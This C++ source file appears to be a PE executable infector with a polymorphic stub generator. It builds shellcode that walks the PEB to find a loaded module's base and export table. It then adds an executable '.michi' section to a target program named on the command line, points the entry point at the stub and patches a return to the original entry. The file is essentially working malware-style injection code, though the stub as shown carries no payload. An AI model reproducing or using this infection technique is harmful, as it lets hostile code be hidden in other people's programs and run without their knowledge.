#include "includes.h"
#define db(x) __asm _emit x



template <typename T>
bool PatchBytesByVal(DWORD DestAddress, DWORD SizeOfCode, LPVOID SrcAddress, T ValToLookFor)
{
	for (int i = 0; i < SizeOfCode; ++i)
	{
		if (*(T*)(DestAddress + i) == ValToLookFor)
		{
			memcpy((PVOID)(DestAddress + i), SrcAddress, sizeof(T));
			return true;
		}
	}
	return false;
}




int main(int argc, char* argv[])
{
	if (argc < 2)
		return 0;
	DWORD Zero = 0;
	PVOID PolyBuff = VirtualAlloc(NULL, 1000, MEM_COMMIT, PAGE_READWRITE);

	PolyStub* gen = new PolyStub(reinterpret_cast<DWORD>(PolyBuff));

	/*
		call l1
	l1:
		pop ebp
		mov eax, 0x30
		mov eax, FS:[eax]
		mov eax, [eax + 0x0C]
		mov eax, [eax + 0x14]
		mov eax, [eax]
		mov eax, [eax]
		mov eax, [eax + 0x10]
		mov [ebp + KernelBase], eax
		add eax, [eax + 0x3C]
		mov eax, [eax + 0x78]
		add eax, [ebp + KernelBase]
		mov [ebp + ExportAddressTable], eax
	_Ret:
		push 0xAAAAAAAA
		ret 0

	KernelBase			dd 0
	ExportAddressTable	dd 0
	*/

	gen->GenJcc(JCC::CALL, "l1");
	gen->Label("l1");
	gen->GenOPReg(OP1::POP, REG::EBP, 0);

	gen->GenOPRegImm(OP::MOV, REG::EAX, 0x30, 0);
	gen->GenPrefix(PREFIX::FS);
	gen->GenOPRegMem(OP::MOV, REG::EAX, REG::EAX, 0, 0);	
	gen->GenOPRegMem(OP::MOV, REG::EAX, REG::EAX, 0x0C, 0);
	gen->GenOPRegMem(OP::MOV, REG::EAX, REG::EAX, 0x14, 0);

	gen->GenOPRegMem(OP::MOV, REG::EAX, REG::EAX, 0, 0);
	gen->GenOPRegMem(OP::MOV, REG::EAX, REG::EAX, 0, 0);
	gen->GenOPRegMem(OP::MOV, REG::EAX, REG::EAX, 0x10, 0);
	gen->GenOPMemReg(OP::MOV, "KernelBase", REG::EAX, 0);

	gen->GenOPRegMem(OP::ADD, REG::EAX, REG::EAX, 0x3C, 0);
	gen->GenOPRegMem(OP::MOV, REG::EAX, REG::EAX, 0x78, 0);
	gen->GenOPRegMem(OP::ADD, REG::EAX, "KernelBase", 0);
	gen->GenOPMemReg(OP::MOV, "ExportAddressTable", REG::EAX, 0);


	gen->Label("_Ret");
	gen->GenOPImm(OP1::PUSH, 0xAAAAAAAA);
	gen->GenOPImm(OP1::RET, 0);
	gen->GenData(&Zero, sizeof(DWORD), "KernelBase");
	gen->GenData(&Zero, sizeof(DWORD), "ExportAddressTable");

	

	PeExplorer* g_pPe = new PeExplorer();
	g_pPe->Explore(argv[1], Size);

	g_pPe->AddNewSection(".michi", Size, 0xE00000E0);
	PIMAGE_SECTION_HEADER NewSection = g_pPe->GetSectionList().at(g_pPe->GetFileHeader()->NumberOfSections - 1);
	DWORD OldEIP = g_pPe->GetOptionalHeader()->AddressOfEntryPoint + g_pPe->GetOptionalHeader()->ImageBase;
	DWORD NewEIP = NewSection->VirtualAddress;
	g_pPe->GetOptionalHeader()->AddressOfEntryPoint = NewEIP;

	DWORD Dst = (DWORD)g_pPe->pMap + NewSection->PointerToRawData;

	memcpy((PVOID)Dst, PolyBuff, gen->GetStubLen());
	
	PatchBytesByVal(Dst, Size + gen->GetStubLen(), &OldEIP, 0xAAAAAAAA);

	g_pPe->~PeExplorer();
	VirtualFree(PolyBuff, 1000, MEM_DECOMMIT);
	std::cin.get();
	return 0;
}
